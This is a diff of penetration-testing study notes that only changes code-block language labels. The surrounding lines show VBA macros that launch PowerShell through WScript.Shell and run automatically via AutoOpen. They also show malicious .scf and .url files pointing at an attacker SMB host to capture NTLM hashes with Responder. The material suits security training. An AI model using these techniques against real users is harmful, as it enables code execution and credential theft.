@@ -152,7 +152,7 @@ graph LR
 - Insert a new module
 
 **2. Basic Macro Structure (Listing 2)**
-```vba
+```text
 Sub MyMacro()
 '
 ' MyMacro Macro
@@ -164,7 +164,7 @@ End Sub
 **3. Leverage ActiveX Objects for OS Command Execution**
 ActiveX Objects provide access to underlying operating system commands via Windows Script Host Shell (`WScript.Shell`).
 
-```vba
+```text
 Sub MyMacro()
   CreateObject("Wscript.Shell").Run "powershell"
 End Sub
@@ -174,7 +174,7 @@ End Sub
 **4. Auto-Execute on Document Open**
 Office macros are not executed automatically by default. We must use the predefined `AutoOpen` macro and `Document_Open` event to trigger execution when the document is opened.
 
-```vba
+```text
 Sub AutoOpen()
   MyMacro
 End Sub
@@ -226,7 +226,7 @@ for i in range(0, len(str), n):
 ```
 
 **4. Final VBA Macro (Listing 8)**
-```vba
+```text
 Sub AutoOpen()
     MyMacro
 End Sub
@@ -300,7 +300,7 @@ sequenceDiagram
 ### Step-by-Step: `.scf` File for NTLM Capture
 
 **1. Create Malicious `.scf` File**
-```ini
+```text
 [Shell]
 Command=2
 IconFile=\\192.168.119.2\share\test.ico
@@ -328,7 +328,7 @@ sudo responder -I eth0 -dwv
 ### Step-by-Step: `.url` File for WebDAV/SMB Trigger
 
 **1. Create Malicious `.url` File**
-```ini
+```text
 [InternetShortcut]
 URL=file://\\192.168.119.2\share\
 IconFile=\\192.168.119.2\share\icon.ico
